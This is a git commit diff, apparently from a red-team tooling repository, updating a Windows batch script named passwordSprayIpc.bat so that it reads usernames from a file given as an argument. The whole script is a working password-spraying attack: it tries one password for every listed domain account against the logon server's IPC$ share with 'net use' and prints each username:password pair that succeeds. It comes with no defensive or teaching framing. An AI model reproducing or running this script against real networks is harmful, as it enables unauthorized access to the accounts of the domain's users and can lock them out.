0904be9824bc7bcb65dabb34e2ed82dbf159742a
AlejandroBaca <31259116+AlejandroBaca@users.noreply.github.com>
2024-06-28 13:35:39 -0700

    Update passwordSprayIpc.bat

--- passwordSprayIpc.bat
+++ passwordSprayIpc.bat
@@ -1,3 +1,4 @@
 @echo off
 @set password=%1
-@FOR /F "delims=" %%n in (users.txt) DO @(@net use %logonserver%\IPC$ /user:%userdomain%\%%n %password% 1>NUL 2>&1 && @echo [*] %%n:%password% && net use /delete %logonserver%\IPC$ > NUL)
+@set userList=%2
+@FOR /F "delims=" %%n in (%userList%) DO @(@net use %logonserver%\IPC$ /user:%userdomain%\%%n %password% 1>NUL 2>&1 && @echo [*] %%n:%password% && net use /delete %logonserver%\IPC$ > NUL)
